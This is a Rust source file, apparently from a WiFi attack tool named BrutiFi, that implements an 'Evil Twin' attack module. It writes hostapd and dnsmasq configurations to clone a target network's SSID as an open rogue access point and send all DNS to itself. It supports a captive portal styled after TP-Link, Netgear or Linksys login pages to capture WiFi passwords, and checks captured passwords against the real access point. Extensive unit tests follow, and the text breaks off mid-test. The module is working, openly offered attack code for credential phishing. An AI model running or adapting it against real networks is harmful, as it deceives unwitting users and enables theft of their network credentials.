/*!
 * Evil Twin Attack Module
 *
 * Implements rogue AP creation with captive portal to capture WiFi credentials.
 * Components:
 * - hostapd: Creates fake AP with same SSID
 * - dnsmasq: DHCP/DNS server redirecting all traffic
 * - Captive portal: Web server presenting fake login page
 * - Credential validation: Tests captured passwords against real AP
 */

use serde::{Deserialize, Serialize};
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

/// Portal template selection
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PortalTemplate {
    /// Generic WiFi login portal
    Generic,
    /// TP-Link router style
    TpLink,
    /// Netgear router style
    Netgear,
    /// Linksys router style
    Linksys,
}

impl std::fmt::Display for PortalTemplate {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PortalTemplate::Generic => write!(f, "Generic"),
            PortalTemplate::TpLink => write!(f, "TP-Link"),
            PortalTemplate::Netgear => write!(f, "Netgear"),
            PortalTemplate::Linksys => write!(f, "Linksys"),
        }
    }
}

/// Evil Twin attack parameters
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvilTwinParams {
    /// Target SSID to impersonate
    pub target_ssid: String,
    /// Target BSSID (optional)
    pub target_bssid: Option<String>,
    /// Target channel
    pub target_channel: u32,
    /// Interface to use for AP
    pub interface: String,
    /// Portal template to use
    pub portal_template: PortalTemplate,
    /// Port for web server
    pub web_port: u16,
    /// DHCP range start
    pub dhcp_range_start: String,
    /// DHCP range end
    pub dhcp_range_end: String,
    /// Gateway IP
    pub gateway_ip: String,
}

impl Default for EvilTwinParams {
    fn default() -> Self {
        Self {
            target_ssid: String::new(),
            target_bssid: None,
            target_channel: 6,
            interface: "en0".to_string(),
            portal_template: PortalTemplate::Generic,
            web_port: 80,
            dhcp_range_start: "192.168.1.100".to_string(),
            dhcp_range_end: "192.168.1.200".to_string(),
            gateway_ip: "192.168.1.1".to_string(),
        }
    }
}

/// Evil Twin attack result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EvilTwinResult {
    /// Attack running
    Running,
    /// Password found and validated
    PasswordFound { password: String },
    /// Attack stopped by user
    Stopped,
    /// Error occurred
    Error(String),
}

/// Evil Twin attack progress updates
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EvilTwinProgress {
    /// Attack started
    Started,
    /// Current step progress
    Step {
        current: u8,
        total: u8,
        description: String,
    },
    /// Client connected
    ClientConnected { mac: String, ip: String },
    /// Credential attempt received
    CredentialAttempt { password: String },
    /// Credential validated successfully
    PasswordFound { password: String },
    /// Credential validation failed
    ValidationFailed { password: String },
    /// Error occurred
    Error(String),
    /// Log message
    Log(String),
}

/// Captured credential
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapturedCredential {
    pub ssid: String,
    pub password: String,
    pub client_mac: String,
    pub client_ip: String,
    pub timestamp: u64,
    pub validated: bool,
}

/// Evil Twin attack state
pub struct EvilTwinState {
    pub running: Arc<AtomicBool>,
    pub hostapd_process: Arc<Mutex<Option<Child>>>,
    pub dnsmasq_process: Arc<Mutex<Option<Child>>>,
    pub web_server_handle: Arc<Mutex<Option<tokio::task::JoinHandle<()>>>>,
    pub captured_credentials: Arc<Mutex<Vec<CapturedCredential>>>,
}

impl Default for EvilTwinState {
    fn default() -> Self {
        Self::new()
    }
}

impl EvilTwinState {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(true)),
            hostapd_process: Arc::new(Mutex::new(None)),
            dnsmasq_process: Arc::new(Mutex::new(None)),
            web_server_handle: Arc::new(Mutex::new(None)),
            captured_credentials: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);

        // Stop hostapd
        if let Ok(mut process) = self.hostapd_process.lock() {
            if let Some(ref mut child) = *process {
                let _ = child.kill();
            }
            *process = None;
        }

        // Stop dnsmasq
        if let Ok(mut process) = self.dnsmasq_process.lock() {
            if let Some(ref mut child) = *process {
                let _ = child.kill();
            }
            *process = None;
        }

        // Stop web server
        if let Ok(mut handle) = self.web_server_handle.lock() {
            if let Some(h) = handle.take() {
                h.abort();
            }
        }
    }
}

/// Check if hostapd is installed
pub fn check_hostapd_installed() -> bool {
    Command::new("hostapd")
        .arg("-v")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

/// Get hostapd version
pub fn get_hostapd_version() -> Option<String> {
    let output = Command::new("hostapd").arg("-v").output().ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}{}", stdout, stderr);

    for line in combined.lines() {
        if line.contains("hostapd") {
            return Some(line.trim().to_string());
        }
    }

    None
}

/// Check if dnsmasq is installed
pub fn check_dnsmasq_installed() -> bool {
    Command::new("dnsmasq")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

/// Get dnsmasq version
pub fn get_dnsmasq_version() -> Option<String> {
    let output = Command::new("dnsmasq").arg("--version").output().ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);

    for line in stdout.lines() {
        if line.contains("Dnsmasq") {
            return Some(line.trim().to_string());
        }
    }

    None
}

/// Generate hostapd configuration file
pub fn generate_hostapd_config(params: &EvilTwinParams) -> anyhow::Result<PathBuf> {
    let config_path = PathBuf::from("/tmp/brutifi_hostapd.conf");

    let config_content = format!(
        r#"# BrutiFi Evil Twin - hostapd configuration
interface={}
driver=nl80211
ssid={}
channel={}
hw_mode=g
ieee80211n=1
wmm_enabled=1

# Open network (no encryption for captive portal)
auth_algs=1
wpa=0
"#,
        params.interface, params.target_ssid, params.target_channel
    );

    let mut file = fs::File::create(&config_path)?;
    file.write_all(config_content.as_bytes())?;

    Ok(config_path)
}

/// Generate dnsmasq configuration file
pub fn generate_dnsmasq_config(params: &EvilTwinParams) -> anyhow::Result<PathBuf> {
    let config_path = PathBuf::from("/tmp/brutifi_dnsmasq.conf");

    let config_content = format!(
        r#"# BrutiFi Evil Twin - dnsmasq configuration
interface={}
dhcp-range={},{},12h
dhcp-option=3,{}
dhcp-option=6,{}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{}
"#,
        params.interface,
        params.dhcp_range_start,
        params.dhcp_range_end,
        params.gateway_ip,
        params.gateway_ip,
        params.gateway_ip
    );

    let mut file = fs::File::create(&config_path)?;
    file.write_all(config_content.as_bytes())?;

    Ok(config_path)
}

/// Start hostapd with configuration
pub fn start_hostapd(
    config_path: &PathBuf,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> anyhow::Result<Child> {
    let _ = progress_tx.send(EvilTwinProgress::Log(
        "Starting hostapd (rogue AP)...".to_string(),
    ));

    let child = Command::new("hostapd")
        .arg(config_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let _ = progress_tx.send(EvilTwinProgress::Log("✓ hostapd started".to_string()));

    Ok(child)
}

/// Start dnsmasq with configuration
pub fn start_dnsmasq(
    config_path: &PathBuf,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> anyhow::Result<Child> {
    let _ = progress_tx.send(EvilTwinProgress::Log(
        "Starting dnsmasq (DHCP/DNS)...".to_string(),
    ));

    let child = Command::new("dnsmasq")
        .arg("-C")
        .arg(config_path)
        .arg("--no-daemon")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let _ = progress_tx.send(EvilTwinProgress::Log("✓ dnsmasq started".to_string()));

    Ok(child)
}

/// Configure interface for AP mode
pub fn configure_interface(
    interface: &str,
    ip: &str,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> anyhow::Result<()> {
    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "Configuring interface {} with IP {}...",
        interface, ip
    )));

    // Bring interface down
    let _ = Command::new("ifconfig")
        .arg(interface)
        .arg("down")
        .output()?;

    // Set IP address
    let _ = Command::new("ifconfig")
        .arg(interface)
        .arg(ip)
        .arg("netmask")
        .arg("255.255.255.0")
        .output()?;

    // Bring interface up
    let _ = Command::new("ifconfig").arg(interface).arg("up").output()?;

    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "✓ Interface {} configured",
        interface
    )));

    Ok(())
}

/// Validate password against real AP
pub fn validate_password_against_ap(
    ssid: &str,
    _bssid: Option<&str>,
    password: &str,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> bool {
    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "Validating password '{}' against AP '{}'...",
        password, ssid
    )));

    // On macOS, we can try to connect using networksetup
    // For now, this is a placeholder - real implementation would use
    // CoreWLAN or networksetup to attempt connection

    #[cfg(target_os = "macos")]
    {
        // Try to join network with password
        let output = Command::new("networksetup")
            .arg("-setairportnetwork")
            .arg("en0")
            .arg(ssid)
            .arg(password)
            .output();

        if let Ok(result) = output {
            if result.status.success() {
                let _ = progress_tx.send(EvilTwinProgress::Log(
                    "✅ Password validated successfully!".to_string(),
                ));
                return true;
            }
        }
    }

    let _ = progress_tx.send(EvilTwinProgress::Log(
        "❌ Password validation failed".to_string(),
    ));
    false
}

/// Run Evil Twin attack
pub fn run_evil_twin_attack(
    params: &EvilTwinParams,
    state: Arc<EvilTwinState>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> EvilTwinResult {
    let _ = progress_tx.send(EvilTwinProgress::Started);

    // Step 1: Check tools
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 1,
        total: 6,
        description: "Verifying tools installation".to_string(),
    });

    if !check_hostapd_installed() {
        let _ = progress_tx.send(EvilTwinProgress::Error(
            "hostapd not found. Install with: brew install hostapd".to_string(),
        ));
        return EvilTwinResult::Error("hostapd not installed".to_string());
    }

    if !check_dnsmasq_installed() {
        let _ = progress_tx.send(EvilTwinProgress::Error(
            "dnsmasq not found. Install with: brew install dnsmasq".to_string(),
        ));
        return EvilTwinResult::Error("dnsmasq not installed".to_string());
    }

    let _ = progress_tx.send(EvilTwinProgress::Log("✓ Tools verified".to_string()));

    // Step 2: Configure interface
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 2,
        total: 6,
        description: "Configuring network interface".to_string(),
    });

    if let Err(e) = configure_interface(&params.interface, &params.gateway_ip, progress_tx) {
        let _ = progress_tx.send(EvilTwinProgress::Error(format!(
            "Failed to configure interface: {}",
            e
        )));
        return EvilTwinResult::Error(format!("Interface configuration failed: {}", e));
    }

    // Step 3: Generate configurations
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 3,
        total: 6,
        description: "Generating configurations".to_string(),
    });

    let hostapd_config = match generate_hostapd_config(params) {
        Ok(path) => path,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to generate hostapd config: {}",
                e
            )));
            return EvilTwinResult::Error("Configuration generation failed".to_string());
        }
    };

    let dnsmasq_config = match generate_dnsmasq_config(params) {
        Ok(path) => path,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to generate dnsmasq config: {}",
                e
            )));
            return EvilTwinResult::Error("Configuration generation failed".to_string());
        }
    };

    let _ = progress_tx.send(EvilTwinProgress::Log(
        "✓ Configurations generated".to_string(),
    ));

    // Step 4: Start hostapd
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 4,
        total: 6,
        description: "Starting rogue AP".to_string(),
    });

    let hostapd_child = match start_hostapd(&hostapd_config, progress_tx) {
        Ok(child) => child,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to start hostapd: {}",
                e
            )));
            return EvilTwinResult::Error("hostapd start failed".to_string());
        }
    };

    if let Ok(mut process) = state.hostapd_process.lock() {
        *process = Some(hostapd_child);
    }

    // Wait a bit for hostapd to initialize
    std::thread::sleep(Duration::from_secs(2));

    // Step 5: Start dnsmasq
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 5,
        total: 6,
        description: "Starting DHCP/DNS server".to_string(),
    });

    let dnsmasq_child = match start_dnsmasq(&dnsmasq_config, progress_tx) {
        Ok(child) => child,
        Err(e) => {
            let _ = progress_tx.send(EvilTwinProgress::Error(format!(
                "Failed to start dnsmasq: {}",
                e
            )));
            state.stop();
            return EvilTwinResult::Error("dnsmasq start failed".to_string());
        }
    };

    if let Ok(mut process) = state.dnsmasq_process.lock() {
        *process = Some(dnsmasq_child);
    }

    // Step 6: Attack running
    let _ = progress_tx.send(EvilTwinProgress::Step {
        current: 6,
        total: 6,
        description: "Evil Twin active - waiting for clients".to_string(),
    });

    let _ = progress_tx.send(EvilTwinProgress::Log(format!(
        "🎯 Evil Twin active on channel {} with SSID '{}'",
        params.target_channel, params.target_ssid
    )));

    let _ = progress_tx.send(EvilTwinProgress::Log(
        "Waiting for clients to connect...".to_string(),
    ));

    EvilTwinResult::Running
}

#[cfg(test)]
mod tests {
    use super::*;

    // =========================================================================
    // Portal Template Tests
    // =========================================================================

    #[test]
    fn test_portal_template_display() {
        assert_eq!(PortalTemplate::Generic.to_string(), "Generic");
        assert_eq!(PortalTemplate::TpLink.to_string(), "TP-Link");
        assert_eq!(PortalTemplate::Netgear.to_string(), "Netgear");
        assert_eq!(PortalTemplate::Linksys.to_string(), "Linksys");
    }

    #[test]
    fn test_portal_template_equality() {
        assert_eq!(PortalTemplate::Generic, PortalTemplate::Generic);
        assert_ne!(PortalTemplate::Generic, PortalTemplate::TpLink);
        assert_ne!(PortalTemplate::TpLink, PortalTemplate::Netgear);
        assert_ne!(PortalTemplate::Netgear, PortalTemplate::Linksys);
    }

    #[test]
    fn test_portal_template_clone() {
        let original = PortalTemplate::TpLink;
        let cloned = original;
        assert_eq!(original, cloned);
    }

    #[test]
    fn test_portal_template_debug() {
        let template = PortalTemplate::Generic;
        let debug_str = format!("{:?}", template);
        assert!(debug_str.contains("Generic"));
    }

    // =========================================================================
    // EvilTwinParams Tests
    // =========================================================================

    #[test]
    fn test_evil_twin_params_default() {
        let params = EvilTwinParams::default();
        assert_eq!(params.target_channel, 6);
        assert_eq!(params.interface, "en0");
        assert_eq!(params.web_port, 80);
        assert_eq!(params.gateway_ip, "192.168.1.1");
        assert_eq!(params.dhcp_range_start, "192.168.1.100");
        assert_eq!(params.dhcp_range_end, "192.168.1.200");
        assert!(params.target_ssid.is_empty());
        assert!(params.target_bssid.is_none());
        assert_eq!(params.portal_template, PortalTemplate::Generic);
    }

    #[test]
    fn test_evil_twin_params_custom_values() {
        let params = EvilTwinParams {
            target_ssid: "MyNetwork".to_string(),
            target_bssid: Some("AA:BB:CC:DD:EE:FF".to_string()),
            target_channel: 11,
            interface: "wlan0".to_string(),
            portal_template: PortalTemplate::Netgear,
            web_port: 8080,
            dhcp_range_start: "10.0.0.100".to_string(),
            dhcp_range_end: "10.0.0.200".to_string(),
            gateway_ip: "10.0.0.1".to_string(),
        };

        assert_eq!(params.target_ssid, "MyNetwork");
        assert_eq!(params.target_bssid, Some("AA:BB:CC:DD:EE:FF".to_string()));
        assert_eq!(params.target_channel, 11);
        assert_eq!(params.interface, "wlan0");
        assert_eq!(params.portal_template, PortalTemplate::Netgear);
        assert_eq!(params.web_port, 8080);
        assert_eq!(params.gateway_ip, "10.0.0.1");
    }

    #[test]
    fn test_evil_twin_params_clone() {
        let original = EvilTwinParams {
            target_ssid: "CloneTest".to_string(),
            target_channel: 6,
            ..Default::default()
        };
        let cloned = original.clone();

        assert_eq!(original.target_ssid, cloned.target_ssid);
        assert_eq!(original.target_channel, cloned.target_channel);
    }

    #[test]
    fn test_evil_twin_params_with_special_ssid_characters() {
        let params = EvilTwinParams {
            target_ssid: "Test Network With Spaces!@#$%".to_string(),
            ..Default::default()
        };
        assert_eq!(params.target_ssid, "Test Network With Spaces!@#$%");
    }

    #[test]
    fn test_evil_twin_params_empty_ssid() {
        let params = EvilTwinParams {
            target_ssid: String::new(),
            ..Default::default()
        };
        assert!(params.target_ssid.is_empty());
    }

    #[test]
    fn test_evil_twin_params_channel_boundaries() {
        // Channel 1 (minimum)
        let params_min = EvilTwinParams {
            target_channel: 1,
            ..Default::default()
        };
        assert_eq!(params_min.target_channel, 1);

        // Channel 14 (maximum for some regions)
        let params_max = EvilTwinParams {
            target_channel: 14,
            ..Default::default()
        };
        assert_eq!(params_max.target_channel, 14);
    }

    // =========================================================================
    // EvilTwinResult Tests
    // =========================================================================

    #[test]
    fn test_evil_twin_result_running() {
        let result = EvilTwinResult::Running;
        assert!(matches!(result, EvilTwinResult::Running));
    }

    #[test]
    fn test_evil_twin_result_password_found() {
        let result = EvilTwinResult::PasswordFound {
            password: "secret123".to_string(),
        };
        if let EvilTwinResult::PasswordFound { password } = result {
            assert_eq!(password, "secret123");
        } else {
            panic!("Expected PasswordFound variant");
        }
    }

    #[test]
    fn test_evil_twin_result_stopped() {
        let result = EvilTwinResult::Stopped;
        assert!(matches!(result, EvilTwinResult::Stopped));
    }

    #[test]
    fn test_evil_twin_result_error() {
        let result = EvilTwinResult::Error("Connection failed".to_string());
        if let EvilTwinResult::Error(msg) = result {
            assert_eq!(msg, "Connection failed");
        } else {
            panic!("Expected Error variant");
        }
    }

    #[test]
    fn test_evil_twin_result_clone() {
        let original = EvilTwinResult::PasswordFound {
            password: "test".to_string(),
        };
        let cloned = original.clone();
        assert!(matches!(
            cloned,
            EvilTwinResult::PasswordFound { password } if password == "test"
        ));
    }

    // =========================================================================
    // EvilTwinProgress Tests
    // =========================================================================

    #[test]
    fn test_evil_twin_progress_started() {
        let progress = EvilTwinProgress::Started;
        assert!(matches!(progress, EvilTwinProgress::Started));
    }

    #[test]
    fn test_evil_twin_progress_step() {
        let progress = EvilTwinProgress::Step {
            current: 3,
            total: 6,
            description: "Configuring interface".to_string(),
        };

        if let EvilTwinProgress::Step {
            current,
            total,
            description,
        } = progress
        {
            assert_eq!(current, 3);
            assert_eq!(total, 6);
            assert_eq!(description, "Configuring interface");
        } else {
            panic!("Expected Step variant");
        }
    }

    #[test]
    fn test_evil_twin_progress_client_connected() {
        let progress = EvilTwinProgress::ClientConnected {
            mac: "AA:BB:CC:DD:EE:FF".to_string(),
            ip: "192.168.1.100".to_string(),
        };

        if let EvilTwinProgress::ClientConnected { mac, ip } = progress {
            assert_eq!(mac, "AA:BB:CC:DD:EE:FF");
            assert_eq!(ip, "192.168.1.100");
        } else {
            panic!("Expected ClientConnected variant");
        }
    }

    #[test]
    fn test_evil_twin_progress_credential_attempt() {
        let progress = EvilTwinProgress::CredentialAttempt {
            password: "attempted_pass".to_string(),
        };

        if let EvilTwinProgress::CredentialAttempt { password } = progress {
            assert_eq!(password, "attempted_pass");
        } else {
            panic!("Expected CredentialAttempt variant");
        }
    }

    #[test]
    fn test_evil_twin_progress_password_found() {
        let progress = EvilTwinProgress::PasswordFound {
            password: "valid_password".to_string(),
        };

        if let EvilTwinProgress::PasswordFound { password } = progress {
            assert_eq!(password, "valid_password");
        } else {
            panic!("Expected PasswordFound variant");
        }
    }

    #[test]
    fn test_evil_twin_progress_validation_failed() {
        let progress = EvilTwinProgress::ValidationFailed {
            password: "wrong_pass".to_string(),
        };

        if let EvilTwinProgress::ValidationFailed { password } = progress {
            assert_eq!(password, "wrong_pass");
        } else {
            panic!("Expected ValidationFailed variant");
        }
    }

    #[test]
    fn test_evil_twin_progress_error() {
        let progress = EvilTwinProgress::Error("Something went wrong".to_string());

        if let EvilTwinProgress::Error(msg) = progress {
            assert_eq!(msg, "Something went wrong");
        } else {
            panic!("Expected Error variant");
        }
    }

    #[test]
    fn test_evil_twin_progress_log() {
        let progress = EvilTwinProgress::Log("Info message".to_string());

        if let EvilTwinProgress::Log(msg) = progress {
            assert_eq!(msg, "Info message");
        } else {
            panic!("Expected Log variant");
        }
    }

    // =========================================================================
    // CapturedCredential Tests
    // =========================================================================

    #[test]
    fn test_captured_credential_creation() {
        let cred = CapturedCredential {
            ssid: "TestNetwork".to_string(),
            password: "secret123".to_string(),
            client_mac: "AA:BB:CC:DD:EE:FF".to_string(),
            client_ip: "192.168.1.100".to_string(),
            timestamp: 1700000000,
            validated: false,
        };

        assert_eq!(cred.ssid, "TestNetwork");
        assert_eq!(cred.password, "secret123");
        assert_eq!(cred.client_mac, "AA:BB:CC:DD:EE:FF");
        assert_eq!(cred.client_ip, "192.168.1.100");
        assert_eq!(cred.timestamp, 1700000000);
        assert!(!cred.validated);
    }

    #[test]
    fn test_captured_credential_validated() {
        let cred = CapturedCredential {
            ssid: "ValidatedNetwork".to_string(),
            password: "correct_password".to_string(),
            client_mac: "11:22:33:44:55:66".to_string(),
            client_ip: "192.168.1.101".to_string(),
            timestamp: 1700000001,
            validated: true,
        };

        assert!(cred.validated);
    }

    #[test]
    fn test_captured_credential_clone() {
        let original = CapturedCredential {
            ssid: "CloneTest".to_string(),
            password: "pass".to_string(),
            client_mac: "AA:BB:CC:DD:EE:FF".to_string(),
            client_ip: "192.168.1.1".to_string(),
            timestamp: 1000,
            validated: true,
        };

        let cloned = original.clone();
        assert_eq!(original.ssid, cloned.ssid);
        assert_eq!(original.password, cloned.password);
        assert_eq!(original.validated, cloned.validated);
    }

    // =========================================================================
    // EvilTwinState Tests
    // =========================================================================

    #[test]
    fn test_evil_twin_state_new() {
        let state = EvilTwinState::new();
        assert!(state.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_evil_twin_state_stop() {
        let state = EvilTwinState::new();
        assert!(state.running.load(Ordering::SeqCst));

        state.stop();

        assert!(!state.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_evil_twin_state_credentials_initially_empty() {
        let state = EvilTwinState::new();
        let credentials = state.captured_credentials.lock().unwrap();
        assert!(credentials.is_empty());
    }

    #[test]
    fn test_evil_twin_state_add_credential() {
        let state = EvilTwinState::new();

        let cred = CapturedCredential {
            ssid: "TestNet".to_string(),
            password: "pass123".to_string(),
            client_mac: "AA:BB:CC:DD:EE:FF".to_string(),
            client_ip: "192.168.1.100".to_string(),
            timestamp: 1700000000,
            validated: false,
        };

        {
            let mut credentials = state.captured_credentials.lock().unwrap();
            credentials.push(cred);
        }

        let credentials = state.captured_credentials.lock().unwrap();
        assert_eq!(credentials.len(), 1);
        assert_eq!(credentials[0].password, "pass123");
    }

    #[test]
    fn test_evil_twin_state_multiple_credentials() {
        let state = EvilTwinState::new();

        {
            let mut credentials = state.captured_credentials.lock().unwrap();
            for i in 0..5 {
                credentials.push(CapturedCredential {
                    ssid: format!("Network{}", i),
                    password: format!("pass{}", i),
                    client_mac: format!("AA:BB:CC:DD:EE:{:02X}", i),
                    client_ip: format!("192.168.1.{}", 100 + i),
                    timestamp: 1700000000 + i as u64,
                    validated: i % 2 == 0,
                });
            }
        }

        let credentials = state.captured_credentials.lock().unwrap();
        assert_eq!(credentials.len(), 5);
        assert!(credentials[0].validated);
        assert!(!credentials[1].validated);
    }

    // =========================================================================
    // Tool Check Tests
    // =========================================================================

    #[test]
    fn test_check_tools_installed() {
        // Just verify functions don't panic
        let _ = check_hostapd_installed();
        let _ = check_dnsmasq_installed();
        let _ = get_hostapd_version();
        let _ = get_dnsmasq_version();
    }

    #[test]
    fn test_check_hostapd_installed_returns_bool() {
        // Verify the function returns without panic and returns a valid bool
        // The result depends on whether hostapd is installed on the system
        let _result: bool = check_hostapd_installed();
    }

    #[test]
    fn test_check_dnsmasq_installed_returns_bool() {
        // Verify the function returns without panic and returns a valid bool
        // The result depends on whether dnsmasq is installed on the system
        let _result: bool = check_dnsmasq_installed();
    }

    // =========================================================================
    // Configuration Generation Tests
    // =========================================================================

    // Note: Configuration generation tests that write to shared file paths
    // are combined into a single test to avoid race conditions in parallel execution.
    // The generate functions write to fixed paths (/tmp/brutifi_hostapd.conf, etc.)
    // which can cause conflicts when tests run in parallel.

    #[test]
    fn test_generate_configs_comprehensive() {
        // This single comprehensive test covers all configuration generation
        // to avoid race conditions from parallel test execution with shared file paths.

        // Test 1: Basic hostapd config
        let basic_params = EvilTwinParams {
            target_ssid: "TestNetwork".to_string(),
            target_channel: 11,
            interface: "wlan0".to_string(),
            ..Default::default()
        };

        let basic_result = generate_hostapd_config(&basic_params);
        assert!(basic_result.is_ok());

        let basic_path = basic_result.unwrap();
        assert!(basic_path.exists());
        let basic_content = fs::read_to_string(&basic_path).unwrap();

        assert!(basic_content.contains("interface=wlan0"));
        assert!(basic_content.contains("ssid=TestNetwork"));
        assert!(basic_content.contains("channel=11"));
        assert!(basic_content.contains("wpa=0")); // Open network for captive portal

        // Test 2: Hostapd config with special SSID characters
        let special_params = EvilTwinParams {
            target_ssid: "Test Network With Spaces".to_string(),
            target_channel: 6,
            interface: "en0".to_string(),
            ..Default::default()
        };

        let special_result = generate_hostapd_config(&special_params);
        assert!(special_result.is_ok());

        let special_path = special_result.unwrap();
        let special_content = fs::read_to_string(&special_path).unwrap();
        assert!(special_content.contains("ssid=Test Network With Spaces"));

        // Test 3: Hostapd config with various channels
        for channel in [1, 6, 11, 13] {
            let params = EvilTwinParams {
                target_ssid: format!("TestNet_ch{}", channel),
                target_channel: channel,
                interface: "test_iface".to_string(),
                ..Default::default()
            };

            let result = generate_hostapd_config(&params);
            assert!(result.is_ok(), "Failed for channel {}", channel);

            let config_path = result.unwrap();
            let content = fs::read_to_string(&config_path).unwrap();
            assert!(
                content.contains(&format!("channel={}", channel)),
                "Missing channel {} in config",
                channel
            );
            assert!(content.contains(&format!("ssid=TestNet_ch{}", channel)));
            assert!(content.contains("interface=test_iface"));
        }

        // Test 4: Dnsmasq config with default params
        let default_params = EvilTwinParams::default();
        let dnsmasq_result = generate_dnsmasq_config(&default_params);
        assert!(dnsmasq_result.is_ok());

        let dnsmasq_path = dnsmasq_result.unwrap();
        assert!(dnsmasq_path.exists());
        let dnsmasq_content = fs::read_to_string(&dnsmasq_path).unwrap();

        assert!(dnsmasq_content.contains(&format!("interface={}", default_params.interface)));
        assert!(dnsmasq_content.contains(&format!(
            "dhcp-range={},{}",
            default_params.dhcp_range_start, default_params.dhcp_range_end
        )));
        assert!(dnsmasq_content.contains(&format!("dhcp-option=3,{}", default_params.gateway_ip)));
        assert!(dnsmasq_content.contains(&format!("address=/#/{}", default_params.gateway_ip)));

        // Test 5: Dnsmasq config with custom IP range
        let custom_params = EvilTwinParams {
            dhcp_range_start: "10.0.0.50".to_string(),
            dhcp_range_end: "10.0.0.150".to_string(),
            gateway_ip: "10.0.0.1".to_string(),
            interface: "wlan0".to_string(),
            ..Default::default()
        };

        let custom_result = generate_dnsmasq_config(&custom_params);
        assert!(custom_result.is_ok());

        let custom_path = custom_result.unwrap();
        let custom_content = fs::read_to_string(&custom_path).unwrap();

        assert!(custom_content.contains("dhcp-range=10.0.0.50,10.0.0.150"));
        assert!(custom_content.contains("dhcp-option=3,10.0.0.1"));
        assert!(custom_content.contains("address=/#/10.0.0.1"));
        assert!(custom_content.contains("interface=wlan0"));

        // Test 6: Consistency between hostapd and dnsmasq configs
        let consistency_params = EvilTwinParams {
            target_ssid: "ConsistencyTest".to_string(),
            interface: "wlan1".to_string(),
            ..Default::default()
        };

        let hostapd_result = generate_hostapd_config(&consistency_params);
        let dnsmasq_result = generate_dnsmasq_config(&consistency_params);

        assert!(hostapd_result.is_ok());
        assert!(dnsmasq_result.is_ok());

        let hostapd_content = fs::read_to_string(hostapd_result.unwrap()).unwrap();
        let dnsmasq_content = fs::read_to_string(dnsmasq_result.unwrap()).unwrap();

        assert!(hostapd_content.contains("interface=wlan1"));
        assert!(dnsmasq_content.contains("interface=wlan1"));

        // Clean up
        let _ = fs::remove_file("/tmp/brutifi_hostapd.conf");
        let _ = fs::remove_file("/tmp/brutifi_dnsmasq.conf");
    }

    // =========================================================================
    // Edge Cases and Error Handling Tests
    // =========================================================================

    #[test]
    fn test_evil_twin_params_unicode_ssid() {
        let params = EvilTwinParams {
            target_ssid: "Network_Test".to_string(),
            ..Default::default()
        };
        assert_eq!(params.target_ssid, "Network_Test");
    }

    #[test]
    fn test_evil_twin_params_max_ssid_length() {
        // WiFi SSID max length is 32 bytes
        let long_ssid = "A".repeat(32);
        let params = EvilTwinParams {
            target_ssid: long_ssid.clone(),
            ..Default::default()
        };
        assert_eq!(params.target_ssid.len(), 32);
    }

    #[test]
    fn test_evil_twin_result_serialization() {
        let result = EvilTwinResult::PasswordFound {
            password: "test123".to_string(),
        };
        let serialized = serde_json::to_string(&result).unwrap();
        assert!(serialized.contains("test123"));

        let deserialized: EvilTwinResult = serde_json::from_str(&serialized).unwrap();
        if let EvilTwinResult::PasswordFound { password } = deserialized {
            assert_eq!(password, "test123");
        } else {
            panic!("Deserialization failed");
        }
    }

    #[test]
    fn test_evil_twin_progress_serialization() {
        let progress = EvilTwinProgress::Step {
            current: 2,
            total: 6,
            description: "Testing".to_string(),
        };

        let serialized = serde_json::to_string(&progress).unwrap();
        let deserialized: EvilTwinProgress = serde_json::from_str(&serialized).unwrap();

        if let EvilTwinProgress::Step {
            current,
            total,
            description,
        } = deserialized
        {
            assert_eq!(current, 2);
            assert_eq!(total, 6);
            assert_eq!(description, "Testing");
        } else {
            panic!("Deserialization failed");
        }
    }

    #[test]
    fn test_captured_credential_serialization() {
        let cred = CapturedCredential {
            ssid: "SerializeTest".to_string(),
            password: "pass".to_string(),
            client_mac: "AA:BB:CC:DD:EE:FF".to_string(),
            client_ip: "192.168.1.100".to_string(),
            timestamp: 1700000000,
            validated: true,
        };

        let serialized = serde_json::to_string(&cred).unwrap();
        let deserialized: CapturedCredential = serde_json::from_str(&serialized).unwrap();

